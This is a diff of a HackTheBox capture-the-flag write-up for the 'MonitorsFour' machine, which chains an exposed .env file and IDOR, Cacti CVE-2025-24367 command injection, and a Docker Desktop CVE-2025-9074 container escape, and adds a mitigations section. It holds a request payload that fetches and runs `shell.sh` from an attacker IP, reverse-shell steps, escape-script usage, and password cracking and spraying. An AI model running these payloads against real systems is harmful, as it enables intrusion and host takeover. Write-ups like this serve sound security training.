@@ -11,11 +11,15 @@ image:
 
 ## Executive Summary
 
-This writeup details the exploitation of **MonitorsFour**, a HackTheBox machine running Windows with Docker Desktop. The attack chain combines three critical vulnerabilities:
+This comprehensive writeup details the complete exploitation of the **MonitorsFour** machine. The attack chain targets severe web misconfigurations, vulnerable monitoring software, and a critical container escape vulnerability in Docker Desktop to achieve full host compromise.
 
-1. **IDOR Vulnerability** - Leaking database credentials and user information
-2. **CVE-2025-24367** - Authenticated RCE in Cacti 1.2.28 via command injection  
-3. **CVE-2025-9074** - Docker Desktop container escape to achieve root access
+**Attack Chain Summary:**
+
+1. **Information Disclosure & IDOR:** Enumeration revealed a misconfigured Nginx server serving a `.env` file, disclosing database credentials. Additionally, an Insecure Direct Object Reference (IDOR) vulnerability on the `/user` API endpoint (`?token=0`) was exploited to leak all user credentials, leading to the extraction and cracking of the `marcus` user's MD5 password hash.
+2. **Authenticated RCE (Initial Access):** The compromised `marcus` credentials were used to authenticate to a hidden Cacti monitoring instance. The Cacti application (v1.2.28) was vulnerable to **CVE-2025-24367**, allowing authenticated command injection via the graph template functionality, which yielded a reverse shell inside a Docker container.
+3. **Container Escape & Privilege Escalation:** Enumeration inside the container identified it was running under Docker Desktop. The environment was vulnerable to **CVE-2025-9074**, which exposed the unauthenticated Docker Engine API to the container network (`192.168.65.7:2375`). This API was abused to spawn a new, privileged Alpine container that mounted the Windows host's `C:\` drive, leading to full system compromise and extraction of the root flag.
+
+**Impact:** Complete system compromise. An external attacker can leverage web vulnerabilities to access internal monitoring tools, achieve code execution within a container, and ultimately break out of the container to gain full administrative access over the underlying Windows host.
 
 ---
 
@@ -82,16 +86,7 @@ Target: http://monitorsfour.htb/
 [05:20:49] 301 -  162B  - /views  ->  http://monitorsfour.htb/views/        
 ```
 
-#### Contact Endpoint Error
-
-The `/contact` endpoint triggers an error revealing the container filesystem structure:
-
-<img src="assets/img/monitorsfour/contact_endpoint.png" alt="error loading image">
-
-This confirms the application is running inside a Docker container.
-
-
-### Exposed Environment File (Information Disclosure)
+### Vulnerability #1: Exposed Environment File (Information Disclosure)
 
 The `.env` file is **publicly accessible** at `/.env`, a critical misconfiguration in production environments. This file contains database credentials:
 
@@ -111,8 +106,17 @@ DB_PASS=f37p2j8f4t0r
 - The `mariadb` hostname indicates Docker networking is in use
 - The path `/var/www/app/views/contact.php` reveals the application structure
 
+#### Contact Endpoint Error
 
-### IDOR (Insecure Direct Object Reference)
+The `/contact` endpoint triggers an error revealing the container filesystem structure:
+
+<img src="assets/img/monitorsfour/contact_endpoint.png" alt="error loading image">
+
+This confirms the application is running inside a Docker container.
+
+---
+
+### Vulnerability #2: IDOR (Insecure Direct Object Reference)
 
 The `/user` endpoint is protected but poorly implemented:
 
@@ -133,6 +137,10 @@ The `/user` endpoint is protected but poorly implemented:
 #### IDOR Exploitation: Token Bypass
 
 The API fails to properly validate the token parameter. Setting `token=0` bypasses all access controls:
+
+```shell
+┌──(kali㉿kali)-[~/HTB/Windows/MonitorsFour]
+└─$ curl -s 'http://monitorsfour.htb/user?token=0' | jq
 
 ```shell
 ┌──(kali㉿kali)-[~/HTB/Windows/MonitorsFour]
@@ -193,7 +201,7 @@ The API fails to properly validate the token parameter. Setting `token=0` bypass
 ]
 ```
 
-Crack the hashes using rockyou breached passwords
+Lets crack the hashes
 
 ```shell
 ┌──(kali㉿kali)-[~/HTB/Windows/MonitorsFour]
@@ -211,7 +219,7 @@ Use the "--show --format=Raw-MD5" options to display all of the cracked password
 Session completed.
 ```
 
-But the credentials `admin:wonderful1` are not valid for `http://monitorsfour.htb`. Let do password spray on WinRM using two found passwords `f37p2j8f4t0r` and `wonderful1`. The usernames are collected from the web page
+But the credentials `admin:wonderful1` are not valid for `http://monitorsfour.htb`. Let do password spray on WinRM using two found passwords `f37p2j8f4t0r` and `wonderful1`
 
 ```shell
 ┌──(kali㉿kali)-[~/HTB/Windows/MonitorsFour]
@@ -243,11 +251,7 @@ WINRM       10.129.2.157    5985   MONITORSFOUR     [-] MonitorsFour\higgins:f37
 WINRM       10.129.2.157    5985   MONITORSFOUR     [-] MonitorsFour\mhiggins:f37p2j8f4t0r
 ```
 
-All these credentails are invalid for WinRM.
-
-### Vhost cacti.monitorsfour.htb
-
-Lets fuzz virtual host, may we find another subdomain
+As these credentails are invalid. lets fuzz virtual host, may we find another subdomain
 
 ```shell
 ┌──(kali㉿kali)-[~/HTB/Windows/MonitorsFour]
@@ -276,12 +280,14 @@ Finished
 ===============================================================
 ```
 
-Found subdomain `cacti.monitorsfour.htb`, add `cacti.monitorsfour.htb` to /etc/hosts
+Add `cacti.monitorsfour.htb` to /etc/hosts
 
 ```shell
 ┌──(kali㉿kali)-[~/HTB/Windows/MonitorsFour]
 └─$ echo "$ip  cacti.monitorsfour.htb" | sudo tee -a /etc/hosts
 ```
+
+#### cacti.monitorsfour.htb
 
 On accessing http://cacti.monitorsfour.htb/, we are directed to login page 
 
@@ -293,8 +299,7 @@ Using credentials `marcus:wonderful1` we are successfully logged in
 
 Cacti version 1.2.28 is vulnerable to [CVE-2025-24367](https://github.com/Cacti/cacti/security/advisories/GHSA-fxrq-fr7h-9rqq). An authenticated Cacti user can abuse graph creation and graph template functionality to create arbitrary PHP scripts in the web root of the application, leading to remote code execution on the server.
 
-### CVE-2025-24367
-#### Explanation
+#### CVE-2025-24367 Explanation
 
 According to Cacti Security Advisories
 
@@ -326,7 +331,7 @@ Content-Type: application/x-www-form-urlencoded
 __csrf_magic=sid%3A1dcc9c6a88c857a829828cf0d4c7983a50c4ea9e%2C1779603184&name=Unix+-+Logged+in+Users&graph_template_id=226&graph_template_graph_id=226&save_component_template=1&title=%7Chost_description%7C+-+Logged+in+Users&vertical_label=percent&image_format_id=3&height=200&width=700&base_value=1000&slope_mode=on&auto_scale=on&auto_scale_opts=2&auto_scale_rigid=on&upper_limit=100&lower_limit=0&unit_value=&unit_exponent_value=&unit_length=&right_axis=&right_axis_label=XXX%0Acreate+my.rrd+--step+300+DS%3Atemp%3AGAUGE%3A600%3A-273%3A5000+RRA%3AAVERAGE%3A0.5%3A1%3A1200%0Agraph+XEoV1.php+-s+now+-a+CSV+DEF%3Aout%3Dmy.rrd%3Atemp%3AAVERAGE+LINE1%3Aout%3A%%3C%3F%3D%60curl%5Cx2010%2E10%2E14%2E108%2Fshell%2Esh%7Cbash%60%3B%3F%3E&right_axis_format=0&right_axis_formatter=0&left_axis_formatter=0&auto_padding=on&tab_width=30&legend_position=0&legend_direction=0&rrdtool_version=1.7.2&action=save
 ```
 
-#### Exploitation
+#### CVE-2025-24367 Exploit
 
 Using the [CyberGeek POC](https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC/tree/main), to automate the exploit, as weak character escaping may causes issue
 
@@ -342,7 +347,7 @@ Receiving objects: 100% (9/9), 6.63 KiB | 6.63 MiB/s, done.
 Resolving deltas: 100% (1/1), done.            
 ```
 
-Setup the listener
+Setup a listener
 
 ```shell
 ┌──(kali㉿kali)-[~/HTB/Windows/MonitorsFour]
@@ -578,7 +583,7 @@ This can lead to execution of a wide range of privileged commands to the engine 
 
 docker desktop and API version
 
-```shell
+```json
 www-data@821fbd6a43fa:/tmp$ curl -s http://192.168.65.7:2375/version | php -r 'echo json_encode(json_decode(file_get_contents("php://stdin")), JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES) . PHP_EOL;'
 {
     "Platform": {
@@ -636,7 +641,7 @@ www-data@821fbd6a43fa:/tmp$ curl -s http://192.168.65.7:2375/version | php -r 'e
 
 Found alpine image, which we can utilize to mount host file system to read files
 
-```shell
+```json
 www-data@821fbd6a43fa:/tmp$ curl -s http://192.168.65.7:2375/images/json | php -r 'echo json_encode(json_decode(file_get_contents("php://stdin")), JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES) . PHP_EOL;'
 [
     {
@@ -980,22 +985,7 @@ main($argc, $argv);
 ?>
 ```
 
-**Explanation: PHP script Docker API**
-
-Key components and API calls issued by above php script:
-
-- `docker_api($url, $method, $endpoint, $data, $return_raw)`: wrapper that performs HTTP requests to the Docker Engine API using `curl`, sends/receives JSON, and optionally returns raw binary for logs.
-- `GET /containers/json`: enumerates containers to find an existing `alpine` container to reuse.
-- `POST /containers/create`: creates a container. The script supplies fields such as `Image`, `Cmd`, and `HostConfig`.
-    - `HostConfig.Privileged = true` — grants extended capabilities inside the container.
-    - `HostConfig.Binds` — mounts the host filesystem into the container (e.g. `/:/mnt/hostfs` or Windows mapping `/mnt/host/c:/mnt/hostfs`).
-- `POST /containers/{id}/start`: starts the created container.
-- `GET /containers/{id}/json`: inspects container state to determine when the command has finished.
-- `GET /containers/{id}/logs?stdout=1&stderr=1`: retrieves combined stdout/stderr logs. The script demuxes Docker's 8-byte framed stream to extract plain output.
-- `POST /containers/{id}/exec` + `POST /exec/{execId}/start`: used in interactive mode to create and attach an exec instance (interactive shell) inside a running container.
-- `POST /containers/{id}/stop` and `DELETE /containers/{id}`: stop and remove the container when `--cleanup` is requested.
-
-Host the script on a web server and upload to box
+Host on a web server and upload to box
 
 
 ```shell
@@ -1011,42 +1001,7 @@ www-data@821fbd6a43fa:/tmp$ curl http:///10.10.15.213/CVE-2025-9074.php -o CVE-2
 100  8675  100  8675    0     0  16710      0 --:--:-- --:--:-- --:--:-- 16682
 ```
 
-This script has two mode:
-
-- cmd (for running a single command). Start an alpine container, execute the command in container as root and then remove the container if --cleanup flag is specified.
-
-- reverse (establishing a reverse shell as root). Start an alpine container and execute a reverse shell as root user in the container.
-
-```shell
-www-data@821fbd6a43fa:/tmp$ php CVE-2025-9074.php 
-╔═══════════════════════════════════════════════════════╗
-║          CVE-2025-9074 - Docker Engine API RCE        ║
-║      Unauthenticated Privileged Container Escape      ║
-║               Docker Desktop < 4.44.3                 ║
-╚═══════════════════════════════════════════════════════╝
-[!] --url required
-Usage: php CVE-2025-9074.php -u <url> [options]
-
-Modes:
-  cmd      Execute single command (default)
-  reverse  Reverse shell callback
-
-Options:
-  -u, --url <url>       Docker API URL (http://1.2.3.4:2375)
-  -m, --mode <mode>     cmd|reverse (default: cmd)
-  -c, --cmd <command>   Command to execute (required for cmd mode)
-  -l, --lhost <ip>      Your IP for reverse shell (required for reverse mode)
-  -p, --lport <port>    Your port (default 4444)
-  --os <os>             linux|mac|windows (default: linux)
-  --cleanup             Remove container after execution
-
-Examples:
-  php CVE-2025-9074.php -u http://192.168.65.7:2375 -m cmd -c "whoami"
-  php CVE-2025-9074.php -u http://192.168.65.7:2375 -m cmd -c "cat /mnt/hostfs/flag.txt" --os windows --cleanup
-  php CVE-2025-9074.php -u http://192.168.65.7:2375 -m reverse -l 10.10.14.36 -p 4444
-```
-
-Since the script mount `C:\` to `/mnt/hostfs`, so root flag is located at `/mnt/hostfs/Users/Administrator/Desktop/root.txt`
+Since the script mount C:\ to /mnt/hostfs, so read the flag at `/mnt/hostfs/Users/Administrator/Desktop/root.txt`
 
 ```shell
 www-data@821fbd6a43fa:/tmp$ php CVE-2025-9074.php --url http://192.168.65.7:2375 -m cmd --os windows -c "cat /mnt/hostfs/Users/Administrator/Desktop/root.txt" --cleanup
@@ -1065,25 +1020,56 @@ www-data@821fbd6a43fa:/tmp$ php CVE-2025-9074.php --url http://192.168.65.7:2375
 [+] Cleaned up
 ```
 
-### Privilege Escalation Summary
+---
 
-**Attack Chain:**
+## Mitigations & Recommendations
 
-- Discovery: From a compromised container we discovered the Docker Engine API reachable on the internal Docker Desktop address (e.g. `192.168.65.7:2375`).
-- Exploitation: Used the PHP script to call unauthenticated Engine API endpoints to `POST /containers/create` with `HostConfig.Privileged=true` and `HostConfig.Binds` mounting the host filesystem.
-- Execution: Started the container (`POST /containers/{id}/start`) and ran commands in it (via `Cmd` at creation or `exec`), then read outputs via `GET /containers/{id}/logs` and `GET /containers/{id}/json`.
-- Escalation: With the host filesystem mounted and privileged capabilities, the attacker could read sensitive host files (e.g. Windows `C:\Users\Administrator\Desktop\root.txt`) and perform actions leading to host compromise.
-- Post-Exploitation: Typical follow-ups include extracting credentials, creating persistence, and lateral movement on the host.
+### 1. Restrict Access to Environment Files & Fix IDOR
 
-**Key Vulnerability:**
+**Action:** Configure the Nginx reverse proxy to deny all external access to hidden files (such as `.env`). Additionally, implement secure session validation and robust type-checking for tokens on the `/user` endpoint to prevent IDOR attacks.
 
-An unauthenticated, network-reachable Docker Engine API allowed attacker-controlled containers to be created with host mounts and privileged mode. That API-level control is the root cause enabling privilege escalation to the host.
+```nginx
+# Nginx configuration block to deny access to hidden files
+location ~ /\. {
+    deny all;
+    access_log off;
+    log_not_found off;
+}
+```
 
-**Mitigations:**
+**Root Cause:** The web server was improperly configured, allowing public retrieval of the `.env` file which leaked database credentials. Furthermore, the backend API failed to strictly validate the token type and value (`?token=0` was likely evaluated as a truthy or bypassed state due to weak type comparison in PHP), granting unauthorized access to sensitive user data.
 
-- Disable exposing the Docker daemon over unauthenticated TCP; require TLS and authentication.
-- Update Docker Desktop to a patched version that fixes CVE-2025-9074.
-- Restrict container networks and avoid placing untrusted workloads on networks that can reach the daemon.
-- Monitor and alert on creation of privileged containers and host bind mounts.
+---
 
+### 2. Update Cacti (Remediate CVE-2025-24367)
+
+**Action:** Upgrade Cacti to version 1.2.29 or apply the official security patch to remediate the command injection vulnerability present in the graph creation components.
+
+```bash
+# Upgrade Cacti via package manager or source installation
+wget https://www.cacti.net/downloads/cacti-1.2.29.tar.gz
+tar -zxvf cacti-1.2.29.tar.gz
+# Follow official upgrade instructions to replace the vulnerable instance
+```
+
+**Root Cause:** Cacti version 1.2.28 failed to sanitize newline characters properly when passing user-controlled input to the `rrdtool` binary. This oversight allowed an authenticated user to inject multiple newlines into parameters like `--right-axis-label`, breaking out of the intended command context and executing arbitrary system commands.
+
+---
+
+### 3. Update Docker Desktop & Secure Docker API (Remediate CVE-2025-9074)
+
+**Action:** Upgrade Docker Desktop to version 4.44.3 or later. Never expose the Docker Engine API (`2375/tcp`) without TLS authentication, especially on local container subnetworks.
+
+```json
+// Example configuration for securing the Docker daemon with TLS in daemon.json
+{
+  "tlsverify": true,
+  "tlscacert": "/etc/docker/ca.pem",
+  "tlscert": "/etc/docker/server-cert.pem",
+  "tlskey": "/etc/docker/server-key.pem",
+  "hosts": ["tcp://0.0.0.0:2376", "unix:///var/run/docker.sock"]
+}
+```
+
+**Root Cause:** Docker Desktop versions between 4.25 and 4.44.2 contained a severe flaw that inherently allowed local Linux containers to access the unauthenticated Docker Engine API via the host gateway (`192.168.65.7:2375`). An attacker who achieved code execution inside any container could use this API to orchestrate a container escape by deploying a new, privileged container with the underlying host's filesystem completely mounted.
 
